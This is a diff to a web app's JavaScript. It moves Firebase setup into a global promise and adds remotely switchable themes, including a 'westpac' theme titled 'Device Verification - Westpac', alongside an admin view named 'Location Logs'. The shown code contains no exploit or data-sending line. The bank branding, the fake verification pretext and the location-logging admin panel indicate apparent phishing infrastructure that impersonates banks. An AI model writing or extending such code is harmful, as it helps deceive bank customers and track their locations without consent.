@@ -9,41 +9,41 @@ const firebaseConfig = {
     appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
 };
 
-// Initialize Firebase
-let database;
-const initFirebase = () => {
-    return new Promise((resolve, reject) => {
-        try {
-            if (!firebase.apps.length) {
-                firebase.initializeApp(firebaseConfig);
-            }
-            database = firebase.database();
-            console.log('Firebase initialized successfully');
-            
-            // Test database connection
-            database.ref('.info/connected').on('value', (snapshot) => {
-                const isConnected = snapshot.val();
-                console.log('Database connection state:', isConnected);
-                if (!isConnected && document.visibilityState !== 'hidden') {
-                    console.warn('Attempting to reconnect to Firebase...');
-                    database.goOnline();
-                }
-            });
-
-            // Test write permission
-            database.ref('test-write').set({
-                timestamp: firebase.database.ServerValue.TIMESTAMP
-            }).then(() => {
-                console.log('Write permission verified');
-                database.ref('test-write').remove();
-                resolve(database);
-            }).catch(reject);
-        } catch (error) {
-            console.error('Firebase initialization error:', error);
-            reject(error);
+// Global promise for Firebase initialization
+window.firebaseReady = new Promise((resolve, reject) => {
+    try {
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
         }
-    });
-};
+        const database = firebase.database();
+        console.log('Firebase initialized successfully');
+        
+        // Test database connection
+        database.ref('.info/connected').on('value', (snapshot) => {
+            const isConnected = snapshot.val();
+            console.log('Database connection state:', isConnected);
+            if (!isConnected && document.visibilityState !== 'hidden') {
+                console.warn('Attempting to reconnect to Firebase...');
+                database.goOnline();
+            }
+        });
+
+        // Export database for use in other scripts
+        window.database = database;
+
+        // Test write permission
+        database.ref('test-write').set({
+            timestamp: firebase.database.ServerValue.TIMESTAMP
+        }).then(() => {
+            console.log('Write permission verified');
+            database.ref('test-write').remove();
+            resolve(database);
+        }).catch(reject);
+    } catch (error) {
+        console.error('Firebase initialization error:', error);
+        reject(error);
+    }
+});
 
 // Initialize theme handling
 let currentTheme = '';
@@ -51,13 +51,13 @@ let currentTheme = '';
 // Initialize Firebase and load theme
 document.addEventListener('DOMContentLoaded', async () => {
     try {
-        await initFirebase();
+        // Wait for Firebase to be ready
+        await window.firebaseReady;
         
         // Initial theme load
         const snapshot = await database.ref('activeTheme').once('value');
         const initialTheme = snapshot.val() || 'westpac';
         applyTheme(initialTheme);
-        document.querySelector('.container').classList.add('loaded');
 
         // Listen for theme changes
         database.ref('activeTheme').on('value', snapshot => {
@@ -73,7 +73,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         console.error('Failed to initialize:', error);
         // Fallback to default theme if Firebase fails
         applyTheme('westpac');
-        document.querySelector('.container').classList.add('loaded');
     }
 });
 
@@ -82,9 +81,31 @@ function applyTheme(themeName) {
     if (!theme) return;
 
     currentTheme = themeName;
-    document.getElementById('themeStyles').href = theme.styles;
-    document.querySelector('.logo-image').src = theme.logo;
-    document.title = `Device Verification - ${theme.name}`;
+    
+    // Update theme elements if they exist (for main site)
+    const themeStyles = document.getElementById('themeStyles');
+    if (themeStyles) {
+        themeStyles.href = theme.styles;
+    }
+
+    const logoImage = document.querySelector('.logo-image');
+    if (logoImage) {
+        logoImage.src = theme.logo;
+    }
+
+    // Update theme select if it exists (for admin panel)
+    const themeSelect = document.getElementById('themeSelect');
+    if (themeSelect && themeSelect.value !== themeName) {
+        themeSelect.value = themeName;
+    }
+
+    // Update CSS variables
+    document.documentElement.style.setProperty('--primary-color', theme.primaryColor);
+    document.documentElement.style.setProperty('--primary-hover', theme.secondaryColor);
+
+    // Update title based on current page
+    const isAdminPanel = document.querySelector('#loginScreen') !== null;
+    document.title = isAdminPanel ? 'Location Logs - Admin View' : `Device Verification - ${theme.name}`;
 }
 
 // Browser detection helper functions
